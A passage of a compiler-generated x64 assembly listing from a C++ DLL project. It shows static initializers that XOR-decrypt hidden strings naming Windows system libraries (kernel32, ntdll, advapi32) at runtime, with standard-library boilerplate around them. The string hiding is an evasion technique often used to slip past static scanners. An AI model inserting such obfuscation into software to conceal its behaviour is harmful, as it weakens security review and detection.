$unwind$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z DD 040a01H
	DD	09340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD 010401H
	DD	04204H
?kernel32$initializer$@freqDLLS@ProcessUtilities@@3P6AXXZEA DQ FLAT:??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::kernel32$initializer$
?ntdll$initializer$@freqDLLS@ProcessUtilities@@3P6AXXZEA DQ FLAT:??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::ntdll$initializer$
?advapi32$initializer$@freqDLLS@ProcessUtilities@@3P6AXXZEA DQ FLAT:??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::advapi32$initializer$
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ PROC ; ProcessUtilities::freqDLLS::<lambda_1>::operator(), COMDAT

; 33   : 		static const std::string kernel32 = std::string(HIDE("kernel32.dll"));	

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN26@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 26548175		; 019517cfH
	mov	DWORD PTR [rbx], 366034020		; 15d13c64H
	mov	DWORD PTR [rbx+4], 1567007216		; 5d66a1f0H
	mov	WORD PTR [rbx+8], 15649			; 00003d21H
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 33   : 		static const std::string kernel32 = std::string(HIDE("kernel32.dll"));	

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN26@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ ENDP ; ProcessUtilities::freqDLLS::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA PROC ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA ENDP ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
text$di	SEGMENT
??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic initializer for 'kernel32'', COMDAT

; 33   : 		static const std::string kernel32 = std::string(HIDE("kernel32.dll"));	

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4V45@A
	add	rbx, rdx
	test	al, 1
	jne	SHORT $LN47@dynamic
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 26548175		; 019517cfH
	mov	DWORD PTR [rbx], 366034020		; 15d13c64H
	mov	DWORD PTR [rbx+4], 1567007216		; 5d66a1f0H
	mov	WORD PTR [rbx+8], 15649			; 00003d21H
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 33   : 		static const std::string kernel32 = std::string(HIDE("kernel32.dll"));	

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN47@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rbx+13], 0
	je	$LN15@dynamic

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	r8d, r8d
	cmp	DWORD PTR __isa_available, 5
	jl	$LN56@dynamic

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm3, XMMWORD PTR __xmm@6f55cd957ba3590f6f55cd957ba3590f
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	r8d, 8
$LN56@dynamic:
	mov	r9, 8022544353138530575			; 6f55cd957ba3590fH
	npad	6
$LL55@dynamic:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, r8b
	and	cl, 7
	shl	cl, 3
	mov	rdx, r9
	shr	rdx, cl
	xor	BYTE PTR [rbx+r8], dl

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	r8
	cmp	r8, 13
	jb	SHORT $LL55@dynamic

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [rbx+13], 0
$LN15@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 33   : 		static const std::string kernel32 = std::string(HIDE("kernel32.dll"));	

	mov	rdx, rbx
	lea	rcx, OFFSET FLAT:?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	lea	rcx, OFFSET FLAT:??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'kernel32''
	add	rsp, 32					; 00000020H
	pop	rbx
	jmp	atexit
??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic initializer for 'kernel32''
text$di	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA PROC ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'kernel32'''::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA ENDP ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'kernel32'''::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ
text$yd	SEGMENT
??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'kernel32'', COMDAT
	sub	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR ?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+24
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN20@dynamic
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR ?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN34@dynamic

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN43@dynamic
$LN34@dynamic:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN20@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	movdqa	xmm0, XMMWORD PTR __xmm@000000000000000f0000000000000000
	movdqa	XMMWORD PTR ?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+16, xmm0

; 4876 :         _My_data._Myres  = _Small_string_capacity;
; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR ?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B, 0
	add	rsp, 40					; 00000028H
	ret	0
$LN43@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN41@dynamic:
??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'kernel32''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@YAXXZ PROC ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rdx], rax
	mov	DWORD PTR [rdx+8], eax
	mov	BYTE PTR [rdx+12], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@YAXXZ ENDP ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ PROC ; ProcessUtilities::freqDLLS::<lambda_2>::operator(), COMDAT

; 34   : 		static const std::string ntdll    = std::string(HIDE("ntdll.dll"));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN21@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	WORD PTR [rbx+9], 379			; 0000017bH
	mov	DWORD PTR [rbx], 1231884053		; 496d0f15H
	mov	DWORD PTR [rbx+4], -1879768175		; 8ff50391H
	mov	BYTE PTR [rbx+8], 23
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 34   : 		static const std::string ntdll    = std::string(HIDE("ntdll.dll"));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN21@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ ENDP ; ProcessUtilities::freqDLLS::<lambda_2>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA PROC ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA ENDP ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
text$di	SEGMENT
??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic initializer for 'ntdll'', COMDAT

; 34   : 		static const std::string ntdll    = std::string(HIDE("ntdll.dll"));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4V45@A
	add	rbx, rdx
	test	al, 1
	jne	SHORT $LN42@dynamic
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	WORD PTR [rbx+9], 379			; 0000017bH
	mov	DWORD PTR [rbx], 1231884053		; 496d0f15H
	mov	DWORD PTR [rbx+4], -1879768175		; 8ff50391H
	mov	BYTE PTR [rbx+8], 23
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 34   : 		static const std::string ntdll    = std::string(HIDE("ntdll.dll"));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN42@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rbx+10], 0
	je	$LN15@dynamic

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	r8d, r8d
	cmp	DWORD PTR __isa_available, 5
	jl	$LN51@dynamic

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm3, XMMWORD PTR __xmm@e3912dfd25097b7be3912dfd25097b7b
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	r8d, 8
$LN51@dynamic:
	mov	r9, -2048805790205510789		; e3912dfd25097b7bH
	npad	9
$LL50@dynamic:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, r8b
	and	cl, 7
	shl	cl, 3
	mov	rdx, r9
	shr	rdx, cl
	xor	BYTE PTR [rbx+r8], dl

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	r8
	cmp	r8, 10
	jb	SHORT $LL50@dynamic

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [rbx+10], 0
$LN15@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 34   : 		static const std::string ntdll    = std::string(HIDE("ntdll.dll"));

	mov	rdx, rbx
	lea	rcx, OFFSET FLAT:?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	lea	rcx, OFFSET FLAT:??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'ntdll''
	add	rsp, 32					; 00000020H
	pop	rbx
	jmp	atexit
??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic initializer for 'ntdll''
text$di	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
